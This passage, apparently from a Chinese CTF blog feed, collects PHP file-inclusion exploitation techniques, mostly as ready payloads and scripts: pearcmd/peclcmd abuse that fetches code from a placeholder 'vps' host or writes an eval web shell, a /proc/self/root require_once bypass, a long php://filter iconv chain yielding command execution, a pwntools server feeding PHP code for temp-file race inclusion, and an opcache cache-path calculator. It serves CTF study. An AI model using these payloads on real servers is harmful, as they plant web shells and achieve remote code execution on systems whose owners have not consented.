class="hljs-operator">-</span><span class="hljs-variable">dependencies</span>   <span class="hljs-built_in">Show</span> <span class="hljs-variable">package</span> <span class="hljs-variable">dependencies</span><br><span class="hljs-variable">package</span><span class="hljs-operator">-</span><span class="hljs-variable">validate</span>       <span class="hljs-variable">Validate</span> <span class="hljs-built_in">Package</span> <span class="hljs-variable">Consistency</span><br><span class="hljs-variable">pickle</span>                 <span class="hljs-variable">Build</span> <span class="hljs-variable">PECL</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">remote</span><span class="hljs-operator">-</span><span class="hljs-variable">info</span>            <span class="hljs-built_in">Information</span> <span class="hljs-variable">About</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Packages</span><br><span class="hljs-variable">remote</span><span class="hljs-operator">-</span><span class="hljs-variable">list</span>            <span class="hljs-built_in">List</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Packages</span><br><span class="hljs-variable">run</span><span class="hljs-operator">-</span><span class="hljs-variable">scripts</span>            <span class="hljs-built_in">Run</span> <span class="hljs-variable">Post</span><span class="hljs-operator">-</span><span class="hljs-built_in">Install</span> <span class="hljs-variable">Scripts</span> <span class="hljs-variable">bundled</span> <span class="hljs-variable">with</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span><br><span class="hljs-variable">run</span><span class="hljs-operator">-</span><span class="hljs-variable">tests</span>              <span class="hljs-built_in">Run</span> <span class="hljs-variable">Regression</span> <span class="hljs-variable">Tests</span><br><span class="hljs-variable">search</span>                 <span class="hljs-variable">Search</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">package</span> <span class="hljs-variable">database</span><br><span class="hljs-variable">shell</span><span class="hljs-operator">-</span><span class="hljs-variable">test</span>             <span class="hljs-variable">Shell</span> <span class="hljs-variable">Script</span> <span class="hljs-variable">Test</span><br><span class="hljs-variable">sign</span>                   <span class="hljs-built_in">Sign</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span> <span class="hljs-variable">distribution</span> <span class="hljs-variable">file</span><br><span class="hljs-variable">svntag</span>                 <span class="hljs-built_in">Set</span> <span class="hljs-variable">SVN</span> <span class="hljs-built_in">Release</span> <span class="hljs-variable">Tag</span><br><span class="hljs-variable">uninstall</span>              <span class="hljs-variable">Un</span><span class="hljs-operator">-</span><span class="hljs-variable">install</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">update</span><span class="hljs-operator">-</span><span class="hljs-variable">channels</span>        <span class="hljs-built_in">Update</span> <span class="hljs-variable">the</span> <span class="hljs-variable">Channel</span> <span class="hljs-built_in">List</span><br><span class="hljs-variable">upgrade</span>                <span class="hljs-variable">Upgrade</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">upgrade</span><span class="hljs-operator">-</span><span class="hljs-variable">all</span>            <span class="hljs-variable">Upgrade</span> <span class="hljs-built_in">All</span> <span class="hljs-variable">Packages</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">Deprecated</span> <span class="hljs-variable">in</span> <span class="hljs-variable">favor</span> <span class="hljs-variable">of</span> <span class="hljs-variable">calling</span> <span class="hljs-variable">upgrade</span> <span class="hljs-variable">with</span> <span class="hljs-variable">no</span> <span class="hljs-variable">parameters</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>其中有三个选项可以利用，分别是config-create、install、download。</p><h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>可以使用install以及download直接下载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>peclcmd.php&amp;+install+-R+<span class="hljs-regexp">/tmp+http:/</span><span class="hljs-regexp">/vps/</span><span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>peclcmd.php&amp;+download+http:<span class="hljs-regexp">//</span>vps/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><p>区别是install需要指定目录，而download会直接下载到网站根目录(不过有时候可能没有写权限)，因此<strong>用download不需要知道根目录路径更方便一些。</strong></p><h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><p>使用config-create直接写</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd.php&amp;+config-create+<span class="hljs-regexp">/&lt;?=eval($_POST[1])?&gt;+/</span>tmp/shell.php<br></code></pre></td></tr></table></figure><p><strong>注意用burp发包，浏览器会给尖括号编码导致后端无法识别。</strong></p><h2 id="require-once绕过"><a href="#require-once绕过" class="headerlink" title="require_once绕过"></a>require_once绕过</h2><p><code>include_once</code> <code>require_once</code>对于同一个文件只能包含一次，事实上我们还可以通过&#x2F;proc&#x2F;self&#x2F;root来绕过，这是php中的一个bug，具体见<a href="https://www.anquanke.com/post/id/213235">链接</a>。</p><p>例题WMCTF2020 make php great again 2.0:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>包含了一次flag.php，无法在包含读取，使用payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><p>多层&#x2F;proc&#x2F;self&#x2F;root嵌套即可，**&#x2F;proc&#x2F;self&#x2F;root本身指向根目录**。</p><h2 id="include2shell"><a href="#include2shell" class="headerlink" title="include2shell"></a>include2shell</h2><p>参考：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>相关脚本：<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><p>简而言之，结合 PHP Base64 宽松性，即使我们使用其他字符编码产生了不可见字符，我们也可以利用 <code>convert.base64-decode</code> 来去掉非法字符，留下我们想要的字符。</p><p>首先回顾一下PHP Base64，它的合法字符包括 <code>A-Za-z0-9\/\=\+</code>，不过值得注意的是php在解码base64的过程中会完全忽略非法字符(不可见字符，控制字符等)，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;\x1bY\xffQ\xfa&quot;</span>;              <span class="hljs-comment">//YQ 为 a 的 base64 编码</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">// string(1) &quot;a&quot;</span><br></code></pre></td></tr></table></figure><p>php中一个叫做<code>convert.iconv</code> 的 Filter，可以用来将数据从字符集 A 转换为字符集 B，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">// Output:</span><br><span class="hljs-comment">// some+ADwAPg-text</span><br></code></pre></td></tr></table></figure><p>在编码转换的过程中，固定字符串中的特定内容会出现变化，利用这种特性我们可以遍历所有字符集去产生我们需要的php代码的base64格式，再结合base64解码的宽松性自动删去base64中夹杂的非法字符最终实现rce。</p><p>最后一个问题就是包含文件在哪里找，要想实现include2rce我们需要知道文件的具体内容，如果data伪协议可用那么好解决，如果不可用我们就需要通过其它技巧来实现。</p><p>比如&#x2F;etc&#x2F;passwd</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.EUCTW&#124;convert.iconv.L4.UTF8&#124;convert.iconv.IEC_P271.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L7.NAPLPS&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.UCS-2LE.UCS-2BE&#124;convert.iconv.TCVN.UCS2&#124;convert.iconv.857.SHIFTJISX0213&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.EUCTW&#124;convert.iconv.L4.UTF8&#124;convert.iconv.866.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L3.T.61&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.SJIS.GBK&#124;convert.iconv.L10.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.ISO-IR-111.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.ISO-IR-111.UJIS&#124;convert.iconv.852.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UTF16.EUCTW&#124;convert.iconv.CP1256.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L7.NAPLPS&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.851.UTF8&#124;convert.iconv.L7.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.CP1133.IBM932&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.UCS-2LE.UCS-2BE&#124;convert.iconv.TCVN.UCS2&#124;convert.iconv.851.BIG5&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.UCS-2LE.UCS-2BE&#124;convert.iconv.TCVN.UCS2&#124;convert.iconv.1046.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UTF16.EUCTW&#124;convert.iconv.MAC.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L7.SHIFTJISX0213&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UTF16.EUCTW&#124;convert.iconv.MAC.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.ISO-IR-111.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.ISO6937.JOHAB&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.L6.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.UTF16LE&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.UCS2.UTF8&#124;convert.iconv.SJIS.GBK&#124;convert.iconv.L10.UCS2&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.iconv.UTF8.CSISO2022KR&#124;convert.iconv.ISO2022KR.UTF16&#124;convert.iconv.UCS-2LE.UCS-2BE&#124;convert.iconv.TCVN.UCS2&#124;convert.iconv.857.SHIFTJISX0213&#124;convert.base64-decode&#124;convert.base64-encode&#124;convert.iconv.UTF8.UTF7&#124;convert.base64-decode/resource=/etc/passwd&amp;0=id</span><br><br></code></pre></td></tr></table></figure><p>最终产生的shell是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]`;;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="compress-zlib生成临时文件"><a href="#compress-zlib生成临时文件" class="headerlink" title="compress.zlib生成临时文件"></a>compress.zlib生成临时文件</h2><p>细节参考<a href="https://blog.zeddyu.info/2020/01/08/36c3-web/#includer">链接</a></p><p>临时文件包含的一个延申，需要开启一个http server返回大文件，造成缓存延迟临时文件驻留。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_chunk</span>(<span class="hljs-params">l, data</span>):<br>    l.send(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;&#125;\r</span><br><span class="hljs-string">&#123;&#125;\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(data))[<span class="hljs-number">2</span>:], data))<br><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    l = listen(<span class="hljs-number">9999</span>)<br>    l.wait_for_connection()<br><br>    data1 = <span class="hljs-string">&#x27;&#x27;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;X&#x27;</span>)<br>    data2 = <span class="hljs-string">&#x27;&lt;?php system(&quot;/readflag&quot;); exit(); /*&#x27;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>    data3 = <span class="hljs-string">&#x27;c*/&#x27;</span>.rjust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br><br>    l.recvuntil(<span class="hljs-string">&#x27;\r\n\r\n&#x27;</span>)<br>    l.send(<span class="hljs-string">&#x27;&#x27;&#x27;HTTP/1.1 200 OK\r</span><br><span class="hljs-string">Content-Type: exploit/revxakep\r</span><br><span class="hljs-string">Connection: close\r</span><br><span class="hljs-string">Transfer-Encoding: chunked\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>    send_chunk(l, data1)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;waiting...&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sending php code...&#x27;</span>)<br><br>    send_chunk(l, data2)<br><br>    sleep(<span class="hljs-number">3</span>)<br><br>    send_chunk(l, data3)<br><br>    l.send(<span class="hljs-string">&#x27;&#x27;&#x27;0\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>    l.close()<br></code></pre></td></tr></table></figure><p>然后就是竞争包含，其中的传输速率问题需要解决，因为竞争的设置需要与速率匹配，这一点可以通过FTP进行速率控制<code>compress.zlib://ftp://</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file=compress.zlib:<span class="hljs-regexp">//</span>ftp:<span class="hljs-regexp">//</span>vps:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><h2 id="nginx临时文件"><a href="#nginx临时文件" class="headerlink" title="nginx临时文件"></a>nginx临时文件</h2><p>依然是临时文件包含的延伸利用姿势。大概利用到如下几条原理：</p><ol><li>当nginx接收fastcgi响应过大则会将一部分内容以临时文件的形式存在硬盘上</li><li>临时文件会被很快清除，但是<code>/proc/xxx/fd/x</code>依然可以取到这个临时文件的内容，pid和fd需要遍历</li><li>利用上面wmctf例题绕过包含次数限制的方法去包含<code>/proc/xxx/fd/x</code>即可</li></ol><p>详细见<a href="https://tttang.com/archive/1384/">链接</a>。</p><h2 id="opcache缓存"><a href="#opcache缓存" class="headerlink" title="opcache缓存"></a>opcache缓存</h2><p>例题：湖湘杯2020 web1</p><p>OPcache是一种通过解析的PHP脚本预编译的字节码存放在共享内存中来避免每次加载和解析PHP脚本的开销，解析器可以直接从共享内存读取已经缓存的字节码，从而大大提高了PHP的执行效率。</p><p>简言之，如果开启了OPcache就会在特定目录下产生php文件的缓存file.php.bin。</p><p>通过查看phpinfo中的opcache.file_cache参数可以找到缓存的目录。</p><p>假设目录为&#x2F;var&#x2F;www&#x2F;cache，那么flag.php的缓存文件路径就是<code>/var/www/cache/[md5]/var/www/html/flag.php.bin</code></p><p>其中的MD5有固定算法，所需要的数据在phpinfo中都可以获取到，计算脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php">import sys<br>import re<br>import requests<br><span class="hljs-keyword">from</span> md5 import md5<br><span class="hljs-keyword">from</span> packaging import version <span class="hljs-comment"># python2 -m pip install -I packaging==17.0</span><br><br><br>url = <span class="hljs-string">&#x27;http://y1ng.vip:4332/&#x27;</span><br>phpinfo_url = url + <span class="hljs-string">&#x27;/?phpinfo&#x27;</span><br><br>text = requests.<span class="hljs-title function_ invoke__">get</span>(phpinfo_url).text<br>php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Version &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> php_version == None:<br>    php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;h1 class=&quot;p&quot;&gt;PHP Version (.*)&#x27;</span>, text)<br><span class="hljs-keyword">if</span> php_version == None:<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;No PHP version found, is this a phpinfo file?&quot;</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>php_version = php_version.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br>php_greater_74 = (version.<span class="hljs-title function_ invoke__">parse</span>(<span class="hljs-string">&quot;7.4.0&quot;</span>) &lt; version.<span class="hljs-title function_ invoke__">parse</span>(php_version.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>]))<br>zend_extension_id = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> zend_extension_id == None:<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;No Zend Extension Build found.&quot;</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>zend_extension_id = zend_extension_id.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br>architecture = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;System &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> architecture == None:<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;No System info found.&quot;</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>architecture = architecture.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_ invoke__">split</span>()[-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;48888&quot;</span><br><span class="hljs-keyword">else</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;44444&quot;</span><br><span class="hljs-keyword">if</span> php_greater_74:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + bin_id_suffix<br><span class="hljs-keyword">else</span>:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_SIZEOF_CHAR&quot;</span> + bin_id_suffix<br><span class="hljs-keyword">if</span> not php_greater_74:<br>    <span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;148888&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;144444&quot;</span><br><br>    alt_zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + alt_bin_id_suffix<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;PHP version : &quot;</span> + php_version<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Zend Extension ID : &quot;</span> + zend_extension_id<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Zend Bin ID : &quot;</span> + zend_bin_id<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Assuming &quot;</span> + architecture + <span class="hljs-string">&quot; architecture&quot;</span><br>digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + zend_bin_id).<span class="hljs-title function_ invoke__">hexdigest</span>()<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;------------&quot;</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;System ID : &quot;</span> + digest<br><span class="hljs-keyword">if</span> not php_greater_74:<br>    alt_digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + alt_zend_bin_id).<span class="hljs-title function_ invoke__">hexdigest</span>()<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;PHP lower than 7.4 detected, an alternate Bin ID is possible:&quot;</span><br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Alternate Zend Bin ID : &quot;</span> + alt_zend_bin_id<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Alternate System ID : &quot;</span> + alt_digest<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;------------&quot;</span><br></code></pre></td></tr></table></figure><p>拿到md5即可直接包含。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>php</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP request smuggling分析总结</title>
